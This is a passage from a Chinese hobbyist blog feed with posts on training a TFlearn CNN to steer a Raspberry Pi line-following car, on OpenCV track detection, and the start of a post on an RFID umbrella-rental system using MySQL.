<p>这两行代码每个处理周期跑一遍，会在<code>img</code>文件夹下创建一张图，命名规则为序号+下划线+转向偏差，图像格式为<code>.jpg</code>，到时候我们把数据输入网络的时候只要用正则表达式把它们分一下不就行了嘛。有了输入和输出我们就可以训练我们的模型了。<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1fbaf6jb9hpj31400p0dpd.jpg" alt="效果图"></p>
<h5 id="训练数据读取"><a href="#训练数据读取" class="headerlink" title="训练数据读取"></a>训练数据读取</h5><p>首先我们通过正则表达式来提取转向角的数据，我们要做的就是获取这个文件夹里所以的文件名，然后按照下划线前面部分的序号对后面的转向数据排序。具体代码如下: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">img_rows, img_cols, img_depth = <span class="number">640</span>, <span class="number">480</span>, <span class="number">1</span></div><div class="line">array_len = <span class="number">1000</span> <span class="comment">#图像总数</span></div><div class="line">yArray = [<span class="number">0</span>]* array_len</div><div class="line">files=os.listdir(<span class="string">"/home/hsm/Desktop/img"</span>)</div><div class="line">files.sort()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(array_len):</div><div class="line">	files_re_a = re.split(<span class="string">r'\.'</span>, files[i])</div><div class="line">	files_re_b = re.split(<span class="string">r'\_'</span>, files_re_a[<span class="number">0</span>])</div><div class="line">	yArray[int(files_re_b[<span class="number">0</span>])<span class="number">-1</span>] = int(files_re_b[<span class="number">1</span>])</div><div class="line"></div><div class="line">Y_data = np.asarray(yArray)</div><div class="line">Y_train = Y_data.reshape(array_len,<span class="number">1</span>);</div><div class="line">Y_train = Y_train.astype(<span class="string">'float32'</span>)</div><div class="line">Y_train /= <span class="number">240</span>  <span class="comment">#归一化处理数据</span></div></pre></td></tr></table></figure>
<p><code>re.split</code>函数可以切分字符串，我对文件名进行了两次切分，提取出了序号信息和转向信息。<br>完成转向信息的提取后，图像的数组就很容易构建，具体代码如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">img_num = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(array_len):</div><div class="line">    i = i + <span class="number">1</span></div><div class="line">    fn = <span class="string">'/home/hsm/Desktop/imgonly/'</span> + str(i) + <span class="string">'.jpg'</span></div><div class="line">    im=cv2.imread(fn,<span class="number">0</span>)</div><div class="line">    img_num.append(im)</div><div class="line"></div><div class="line">X_data=np.asarray(img_num)</div><div class="line"></div><div class="line"><span class="comment">#print X_data.shape</span></div><div class="line"></div><div class="line">X_train= X_data.reshape(array_len,img_rows,img_cols,<span class="number">1</span>)</div><div class="line">X_train = X_train.astype(<span class="string">'float32'</span>)</div><div class="line">X_train /= <span class="number">255</span></div></pre></td></tr></table></figure>
<p>这里漏了一步，刚才提到我们图像命名非常的不科学，那么如何通过openCV按顺序读取它们并转换为灰度数组呢？我把刚才的图像文件夹复制了一份，并用macOS下的批量重命名工具将它们处理成按序号命名的图像了。</p>
<h5 id="CNN卷积神经网络的建立与训练"><a href="#CNN卷积神经网络的建立与训练" class="headerlink" title="CNN卷积神经网络的建立与训练"></a>CNN卷积神经网络的建立与训练</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">net = tflearn.input_data(shape=[None, img_rows, img_cols, img_depth], name=&apos;input&apos;)</div><div class="line"></div><div class="line">net = tflearn.conv_2d(net, 8, [4, 5], strides=2, activation=&apos;relu&apos;)</div><div class="line"></div><div class="line">net = tflearn.conv_2d(net, 8, [4, 5], strides=2, activation=&apos;relu&apos;)</div><div class="line"></div><div class="line">net = tflearn.conv_2d(net, 16, [4, 5], strides=2, activation=&apos;relu&apos;)</div><div class="line"></div><div class="line">net = tflearn.conv_2d(net, 32, [2, 2], activation=&apos;relu&apos;)</div><div class="line"></div><div class="line">net = tflearn.fully_connected(net, 128, activation=&apos;relu&apos;)</div><div class="line"></div><div class="line">net = tflearn.dropout(net, 0.8)</div><div class="line"></div><div class="line">net = tflearn.fully_connected(net, 64, activation=&apos;relu&apos;)</div><div class="line">net = tflearn.dropout(net, 0.8)</div><div class="line"></div><div class="line">net = tflearn.fully_connected(net, 32, activation=&apos;relu&apos;)</div><div class="line">net = tflearn.dropout(net, 0.8)</div><div class="line"></div><div class="line">net = tflearn.fully_connected(net, 8, activation=&apos;relu&apos;)</div><div class="line">net = tflearn.dropout(net, 0.8)</div><div class="line"></div><div class="line">net = tflearn.fully_connected(net, 1, activation=&apos;tanh&apos;)</div><div class="line"></div><div class="line">net = tflearn.regression(net, loss=&apos;mean_square&apos;, metric=&apos;accuracy&apos;, learning_rate=1e-4, name=&apos;target&apos;)</div><div class="line"></div><div class="line">model = tflearn.DNN(net)</div><div class="line"></div><div class="line">model.fit(X_train, Y_train, n_epoch=10, batch_size=8,show_metric=True)</div><div class="line"></div><div class="line">model.save(&quot;/home/hsm/Desktop/model1/model1.tfl&quot;)</div></pre></td></tr></table></figure>
<p>这里就不多做解释了，有兴趣的读者可以参考TFlearn的官方文档，写的非常详细，最后将训练好的模型存到指定的位置方便下次使用。<br>训练的过程：<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1fbafa8bajaj30o20k8te7.jpg" alt="训练过程"><br>这里显示的精确度为1并不可靠。至于之前为什么强调内存问题，由于模型的训练非常吃内存，实测训练2770张图片，<code>batch_size</code>参数设为16将占用大约12GB内存，事实上我是用32GB内存的电脑训练的。</p>
<h5 id="模型的使用和检验"><a href="#模型的使用和检验" class="headerlink" title="模型的使用和检验"></a>模型的使用和检验</h5><p>代码大概是这样，仍然需要先将要测试的图片读进来并且<code>reshape</code>一下，调用<code>model.predict</code>预测转向角。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">result = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(array_len):</div><div class="line">	pred = model.predict([X_in[i]])</div><div class="line">	result.append(pred[<span class="number">0</span>][<span class="number">0</span>])</div><div class="line"><span class="keyword">print</span> result</div><div class="line">y = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, array_len<span class="number">-1</span>):</div><div class="line">	y.append(Y_train[i][<span class="number">0</span>])</div><div class="line"><span class="keyword">print</span> y</div></pre></td></tr></table></figure></p>
<p>为了更加方便的观察预测值和准确值的吻合情况，我使用了matplotlib库来绘图，画出来的曲线如下:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1fbag4hptgqj30m80goab4.jpg" alt=""><br>看起来有一些简陋，因为快期末考试了没时间画细致的图，所以先原谅我没有图例。横轴是图片的序号，纵轴是转向角，范围从-1到1。绿色的线是准确值，蓝色的线是模型的预测值，总体来看效果还不错。</p>
<h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><p>我至今仍然不确定Tensorflow是否可以在ARM架构的CPU上运行，如果不行的话，我的解决方案大概有这么两个：</p>
<ol>
<li>换用Intel的小型一体机，不但满足x64架构的条件，而且数据处理能力也比我们现在使用的树莓派强上百倍。</li>
<li>Python网络编程，通过WLAN将Pi采集的图片发到我的笔记本上，调用模型计算出转弯角度再将数据发回去。这个方案不是不行，不过貌似比较复杂。</li>
</ol>
<p>如果有碰巧读到这篇文章的读者，欢迎和我交流一下思路，感激不尽。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;上篇文章讲到了用树莓派和openCV库来做简单的循迹，在这篇文章里我们将尝试用树莓派做一些更酷的事情。我们不希望给小车具体的规则(explicitly programmed)去做循迹，而是让它自己从已有的数据集(包括图像与转向角)学习如何循迹，没错这就是机器学习。&lt;/p&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
      <category term="Python" scheme="https://hsmouc.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>使用Raspberry Pi制作循迹小车</title>
    <link href="https://hsmouc.com/2016/12/06/2016-12-6-pi/"/>
    <id>https://hsmouc.com/2016/12/06/2016-12-6-pi/</id>
    <published>2016-12-06T05:12:15.000Z</published>
    <updated>2016-12-06T05:01:30.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>最近一直在做树莓派相关的东西，终极目标是用它做一个使用cnn卷积神经网络算法的人工智能小车。这个坑很大需要好多时间来填，万里长征第一步就是训练数据的采集。在这篇文章里介绍了通过Python和CV2视觉库实现自动驾驶。</p>
<a id="more"></a> 
<h2 id="硬件的准备"><a href="#硬件的准备" class="headerlink" title="硬件的准备"></a>硬件的准备</h2></li>
<li>Raspberry Pi 3(树莓派) 操作系统ubuntu 16.04</li>
<li>电机驱动电路</li>
<li>电池与稳压电路</li>
<li>舵机</li>
<li>车模<h3 id="电机-舵机控制方案"><a href="#电机-舵机控制方案" class="headerlink" title="电机/舵机控制方案"></a>电机/舵机控制方案</h3></li>
<li><p>说明一下，因为去年参加了飞思卡尔比赛，所以车模直接使用了飞思卡尔比赛的C车，电机是由NXP公司的MKL25单片机控制的。且给的是固定速度，也就是说由Raspberry Pi控制转向，单片机控制速度，两者之间并没有耦合关系，是完全独立的系统。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1fagt8pswuzj31kw16o4bg.jpg" alt="整车"><br><em>因为Pi貌似只能提供软件PWM，也就是说PWM波的频率越高，CPU使用越多。示波器实测频率极限大约为5KHz，电机要求频率为10KHz,所以不使用Pi来控制电机。</em>   </p>
<blockquote>
<p>Each pin activated in softPWM mode uses approximately 0.5% of the CPU.  </p>
</blockquote>
</li>
<li><p>舵机由树莓派提供100Hz的PWM波控制。</p>
</li>
</ul>
<h3 id="供电方案"><a href="#供电方案" class="headerlink" title="供电方案"></a>供电方案</h3><p>所有的设备由7.2V电池提供电力，树莓派需降压到5V，舵机需降压到5.7V。<br><em>tips:Pi的开机电流比较大，实测AMS11175.0稳压芯片提供的5V电压无法保证Pi正常开机，所以需要大电流稳压芯片</em><br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1fagt5vvlf2j31kw16oh8r.jpg" alt="稳压电路与电机驱动"></p>
<h3 id="图像采集方案"><a href="#图像采集方案" class="headerlink" title="图像采集方案"></a>图像采集方案</h3><p>车上搭载了支持UVC协议的数字摄像头，具体的型号我也记不清了。在某宝上搜索UVC摄像头即可。摄像头与Raspberry Pi之间使用USB连接，我们使用的摄像头640*480分辨率，但是实测帧数较低，可能是Pi本身性能有限，代码拍照间隔大约为0.1s。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="粗糙但可靠的方案"><a href="#粗糙但可靠的方案" class="headerlink" title="粗糙但可靠的方案"></a>粗糙但可靠的方案</h3><ul>
<li>思路<br>摄像头采集图像流，使用Python定时器的功能每0.1s处理一次图像。赛道为白色，赛道外部为蓝色，通过图像的灰度差来判断赛道边界。取图像的中线，按640*480的分辨率取第320行。设置一个灰度阈值，从320行的第240个像素点左右找灰度跳变处并记录坐标，左右边界坐标相加取平均与240作差即可获得与赛道中线的偏差。</li>
<li>代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> cv2</div><div class="line"><span class="keyword">import</span> cv2.cv <span class="keyword">as</span> cv</div><div class="line"><span class="keyword">import</span> RPi.GPIO <span class="keyword">as</span> GPIO</div><div class="line"><span class="comment">#读视频流</span></div><div class="line">cap=cv2.VideoCapture(<span class="number">0</span>)</div><div class="line">i = <span class="number">0</span></div><div class="line">LEdge = <span class="number">0</span></div><div class="line">REdge = <span class="number">0</span></div><div class="line">lineErr = <span class="number">0</span></div><div class="line"><span class="comment">#GPIO-PWM初始化，设定频率为100Hz</span></div><div class="line">GPIO.setmode(GPIO.BOARD)</div><div class="line">GPIO.setup(<span class="number">12</span>,GPIO.OUT)</div><div class="line">p = GPIO.PWM(<span class="number">12</span>,<span class="number">100</span>)</div><div class="line">p.start(<span class="number">0</span>)</div></pre></td></tr></table></figure>
<p>获取图像函数部分，由于需要为神经网络系统提供训练数据，所以把采集到的图片按顺序存放在img文件夹下。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fetch_img</span><span class="params">()</span>:</span></div><div class="line">        <span class="keyword">global</span> i,fn,im</div><div class="line">        fn = <span class="string">'img/'</span>+str(i)+<span class="string">'.jpg'</span></div><div class="line">        ret,im=cap.read()</div><div class="line">        cv2.imwrite(fn, im)</div><div class="line">        i = i + <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>处理图像函数部分，每隔0.1s执行一次：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_img</span><span class="params">()</span>:</span></div><div class="line">        t = threading.Timer(<span class="number">0.1</span>,process_img)</div><div class="line">        t.start()</div><div class="line">        <span class="keyword">global</span> LEdge,REdge,lineErr</div><div class="line">        fetch_img()</div><div class="line">        <span class="comment">#获取灰度图像</span></div><div class="line">        gray=cv2.cvtColor(im, cv2.COLOR_BGR2GRAY)</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">640</span>):</div><div class="line">                <span class="keyword">if</span> gray[<span class="number">240</span>][j] &lt; <span class="number">80</span>: <span class="comment">#设置阈值为80</span></div><div class="line">                        gray[<span class="number">240</span>][j] = <span class="number">0</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                        gray[<span class="number">240</span>][j] = <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">320</span>,<span class="number">640</span>,<span class="number">1</span>):</div><div class="line">                <span class="keyword">if</span> gray[<span class="number">240</span>][k] == <span class="number">0</span>:</div><div class="line">                        REdge = k</div><div class="line">                        <span class="keyword">break</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">320</span>,<span class="number">0</span>,<span class="number">-1</span>):</div><div class="line">                <span class="keyword">if</span> gray[<span class="number">240</span>][k] == <span class="number">0</span>:</div><div class="line">                        LEdge = k</div><div class="line">                        <span class="keyword">break</span></div><div class="line">        lineErr = (REdge+LEdge)/<span class="number">2</span><span class="number">-320</span></div><div class="line">        <span class="keyword">print</span> lineErr</div></pre></td></tr></table></figure></p>
<p>主函数部分，控制舵机方向：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">        <span class="keyword">global</span> t,lineErr</div><div class="line">        process_img()</div><div class="line">        t = threading.Timer(<span class="number">1</span>, process_img)</div><div class="line">        t.start()</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">                        dc = <span class="number">8</span> - lineErr/<span class="number">40</span></div><div class="line">                        <span class="comment">#简单的比例控制，舵机PWM波占空比动态范围为6%-10%，8%时转向角度为0</span></div><div class="line">                        <span class="keyword">if</span> dc &gt; <span class="number">10</span>:</div><div class="line">                                dc = <span class="number">10</span></div><div class="line">                        <span class="keyword">if</span> dc &lt; <span class="number">6</span>:</div><div class="line">                                dc = <span class="number">6</span></div><div class="line">                        p.ChangeDutyCycle(dc)</div><div class="line">        <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">                <span class="keyword">pass</span></div><div class="line">        p.stop()</div><div class="line">        GPIO.cleanup()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">        main()</div></pre></td></tr></table></figure>
<h3 id="精致但不可靠的方案"><a href="#精致但不可靠的方案" class="headerlink" title="精致但不可靠的方案"></a>精致但不可靠的方案</h3><h4 id="霍夫线-HoughLine-变换"><a href="#霍夫线-HoughLine-变换" class="headerlink" title="霍夫线(HoughLine)变换"></a>霍夫线(HoughLine)变换</h4><p>霍夫线变换是一种用来寻找直线的方法，在opencv中相关函数为<code>HoughLines</code>和<code>HoughLinesP</code></p>
<h4 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h4><p>既然霍夫线变换可以寻找图片中的直线，那么我们可以利用这种算法提取赛道边缘并得出边缘线和车身前进方向的夹角，以此判断前进方向与赛道中线的偏差。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> cv2.cv <span class="keyword">as</span> cv</div><div class="line"><span class="keyword">import</span> math</div><div class="line"></div><div class="line">im=cv.LoadImage(<span class="string">'img/213.jpg'</span>, cv.CV_LOAD_IMAGE_GRAYSCALE)</div><div class="line"></div><div class="line">pi = math.pi</div><div class="line">x = <span class="number">0</span></div><div class="line">dst = cv.CreateImage(cv.GetSize(im), <span class="number">8</span>, <span class="number">1</span>)</div><div class="line"></div><div class="line">cv.Canny(im, dst, <span class="number">200</span>, <span class="number">200</span>)</div><div class="line">cv.Threshold(dst, dst, <span class="number">100</span>, <span class="number">255</span>, cv.CV_THRESH_BINARY)</div><div class="line"></div><div class="line">color_dst_standard = cv.CreateImage(cv.GetSize(im), <span class="number">8</span>, <span class="number">3</span>)</div><div class="line">cv.CvtColor(im, color_dst_standard, cv.CV_GRAY2BGR)<span class="comment">#Create output image in RGB to put red lines</span></div><div class="line"></div><div class="line">lines = cv.HoughLines2(dst, cv.CreateMemStorage(<span class="number">0</span>), cv.CV_HOUGH_STANDARD, <span class="number">1</span>, pi/<span class="number">180</span>, <span class="number">90</span>, <span class="number">80</span>, <span class="number">200</span>)</div><div class="line">old = lines[<span class="number">0</span>][<span class="number">1</span>]*<span class="number">180</span>/pi</div><div class="line"><span class="keyword">for</span> (rho, theta) <span class="keyword">in</span> lines[:<span class="number">100</span>]:</div><div class="line">    err = theta*<span class="number">180</span>/pi - old</div><div class="line">    <span class="keyword">if</span> abs(err) &gt; <span class="number">3</span>:</div><div class="line">        x = x + theta*<span class="number">180</span>/pi</div><div class="line">    old = theta*<span class="number">180</span>/pi</div><div class="line">    a = math.cos(theta) </div><div class="line">    b = math.sin(theta)</div><div class="line">    x0 = a * rho</div><div class="line">    y0 = b * rho</div><div class="line">    pt1 = (cv.Round(x0 + <span class="number">1000</span>*(-b)), cv.Round(y0 + <span class="number">1000</span>*(a)))</div><div class="line">    pt2 = (cv.Round(x0 - <span class="number">1000</span>*(-b)), cv.Round(y0 - <span class="number">1000</span>*(a)))</div><div class="line">    cv.Line(color_dst_standard, pt1, pt2, cv.CV_RGB(<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>), <span class="number">2</span>, <span class="number">4</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x</div><div class="line">cv.ShowImage(<span class="string">"Hough Standard"</span>, color_dst_standard)</div><div class="line">cv.WaitKey(<span class="number">0</span>)</div></pre></td></tr></table></figure></p>
<p>这里载入了一张已经拍摄好的赛道图片，提取直线并绘图，运行结果如下：  </p>
<p><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1fagyoqqoi0j30sf0lzdkj.jpg" alt="screenshot"><br>可以清楚地看到赛道的两边被描绘出来，由<code>theta</code>值计算出角度。</p>
<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1fagywx9vqxj30sg0lydjy.jpg" alt="screenshot"><br>尽管<code>HoughLines</code>函数提供了阈值，最长线，最短线的设置，想获得准确的路线信息还是很困难。测试场地的干扰实在太多，很难消除周边环境的影响，最终在测试了各种情况后，放弃了这种方法。<br>另外霍夫线变换对直线的提取对于树莓派的CPU来说实在是太吃力了，增加了系统的控制周期，导致系统的动态性能很差。</p>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;最近一直在做树莓派相关的东西，终极目标是用它做一个使用cnn卷积神经网络算法的人工智能小车。这个坑很大需要好多时间来填，万里长征第一步就是训练数据的采集。在这篇文章里介绍了通过Python和CV2视觉库实现自动驾驶。&lt;/p&gt;
    
    </summary>
    
      <category term="嵌入式开发" scheme="https://hsmouc.com/categories/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Pi" scheme="https://hsmouc.com/tags/Pi/"/>
    
      <category term="C" scheme="https://hsmouc.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>基于RFID和Raspberry Pi的雨伞租赁系统设计</title>
    <link href="https://hsmouc.com/2016/11/26/2016-11-26-pi/"/>
    <id>https://hsmouc.com/2016/11/26/2016-11-26-pi/</id>
    <published>2016-11-26T13:22:35.000Z</published>
    <updated>2016-12-06T04:13:43.000Z</updated>
    
    <content type="html"><![CDATA[<ul>
<li><p>这篇文章是机器人实验课的项目记录。这个项目的目标是制作一个校园雨伞租赁系统，师生只需要刷校园卡就可以从伞架借走一把伞，还伞的时候只需要刷卡就可以归还。功能看起来很简单，但让这个系统稳定合理的工作却花了我不少时间。</p>
<a id="more"></a> 
<h2 id="系统的工作流程"><a href="#系统的工作流程" class="headerlink" title="系统的工作流程"></a>系统的工作流程</h2></li>
</ul>
<ol>
<li>用户需要在借伞前注册自己的IC卡信息，否则会在刷卡时提示该用户未注册，不能享受此服务。用户刷卡后读取IC卡信息，当确定该用户没有恶意不还伞记录并且之前没有借过伞后，会同意该用户的借伞请求，打开锁伞设备的开关，记录该用户已借伞。</li>
<li>用户刷卡还伞时，同样打开开关，提示用户将伞放入设备内，确认放入后，关闭开关，此时若有开关无法正常闭合，或者检测出设备内物品与标准伞有出入，会提示用户重新放伞，直到检测到标准伞正确放入，记录用户已还伞。</li>
<li>若用户在还伞截止时间前并未还伞，则将该用户列入黑名单，不再为该用户提供借伞服务。</li>
</ol>
<p>P.S 目前还伞的检测还没有做，现在是还伞刷一下卡系统开锁，开完锁就会认为你把伞还了，我相信大家还是比较有素质的(´･_･`)，附上一张很早以前画的流程图：<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1fa6ermgavlj30q50njdhz.jpg" alt="流程图"></p>
<h2 id="系统的硬件设计"><a href="#系统的硬件设计" class="headerlink" title="系统的硬件设计"></a>系统的硬件设计</h2><h3 id="硬件组成"><a href="#硬件组成" class="headerlink" title="硬件组成"></a>硬件组成</h3><ul>
<li>Raspberry 2B+</li>
<li>RFID读卡模块</li>
<li>稳压电源模块</li>
<li>电磁铁</li>
</ul>
<h3 id="电路设计"><a href="#电路设计" class="headerlink" title="电路设计"></a>电路设计</h3><p>由于Raspberry Pi本身已经集成了各种各样的引脚功能，所以电路设计上就没有很多值得提的地方。<br>220v交流电压输入经过稳压电路得到5v直流电压给Raspberry Pi和RFID读卡模块供电，12v直流电压提供给电磁铁。Raspberry Pi提供3.3v的高电平控制MOS管开关电磁铁回路。我主要负责软件，这些电路的事情就交给靠谱的小伙伴们了。</p>
<h2 id="系统的软件设计"><a href="#系统的软件设计" class="headerlink" title="系统的软件设计"></a>系统的软件设计</h2><ul>
<li>软件设计部分是我负责的，所以我尽量说的详细一些。</li>
</ul>
<h3 id="软件环境"><a href="#软件环境" class="headerlink" title="软件环境"></a>软件环境</h3><ul>
<li>ubuntu 14.04 for ARM</li>
<li>wiringPi</li>
<li>MySQL  </li>
</ul>
<h3 id="系统工作流程的再探究"><a href="#系统工作流程的再探究" class="headerlink" title="系统工作流程的再探究"></a>系统工作流程的再探究</h3><p>租赁系统看起来很简单，要弄清楚的无非是下面的这几个问题：   </p>
<ol>
<li>来者何人？</li>
<li>借还是还？</li>
<li>能借给他不？  </li>
</ol>
<p>首先我们分析第一个问题：判断用户身份由很多种方法，我们选择了较为经济的一种方式—在食堂，水房，门禁随处可见的射频读卡技术。我们只需要阅读购买的RFID读卡模块的使用文档，由串口即可获得ID的信息，通过比对ID，第一个问题解决了。<br>第二个问题看似很无脑，但事实上正是为了可靠的解决第二个问题，我们需要多写50行左右的代码使用数据库。解释下使用数据库的原因：数据库的数据是存在硬盘(Raspi是SD卡)里的，而程序运行过程中开辟的空间是存在RAM里面的。如果我们不能把用户的借出归还标志存入磁盘，断电重启系统后会丢失数据。举个例子：老王昨天借了把伞，借完就停电了。第二天准备去还伞的老王看到机器又扔给他一把伞。这显然是需要避免的情况。而数据库技术很好的解决了这个问题。<br>第三个问题讲的是规则设定。在我们的系统中借伞时间超过两天则会被视为违规，取消你借伞的权利。为了便于课上演示，在实际程序中我调用的系统时间是分钟级，也就是借伞超过两分钟你就被ban了。  </p>
<h3 id="数据库的设计"><a href="#数据库的设计" class="headerlink" title="数据库的设计"></a>数据库的设计</h3><p>数据库选用了比较流行的MySQL，具有良好的C语言接口。下面是数据库的建立过程：<br>首先在终端中连接数据库，并创建umbrella_db的数据库。 </p>
<p><code>mysql -u root -p</code><br><code>create database umbrella_db</code>;   </p>
<p>由于下面的这个语句比较长，所以我们写一个小小的脚本来生成users表，建立<code>createtable.sql</code>文件，内容为:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">create table users</div><div class="line">(</div><div class="line">        id_0 int unsigned not null auto_increment primary key,</div><div class="line">        id_1 int unsigned not null,</div><div class="line">        id_2 int unsigned not null,</div><div class="line">        id_3 int unsigned not null,</div><div class="line">        id_4 int unsigned not null,</div><div class="line">        id_5 int unsigned not null,</div><div class="line">        id_6 int unsigned not null,</div><div class="line">        id_7 int unsigned not null,</div><div class="line">        id_8 int unsigned not null,</div><div class="line">        id_9 int unsigned not null,</div><div class="line">        id_10 int unsigned not null,</div><div class="line">        id_11 int unsigned not null,</div><div class="line">        id_12 int unsigned not null,</div><div class="line">        name char(8) not null,</div><div class="line">        return_state int unsigned not null,</div><div class="line">        time int unsigned not null</div><div class="line">);</div></pre></td></tr></table></figure>
<p>之后在MySQL控制台输入<code>source createtable.sql</code>即可，注意文件路径。<br>建立成功后的表单如图所示：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1fa6f12c7ddj30oy0djacx.jpg" alt="MySQL">  </p>
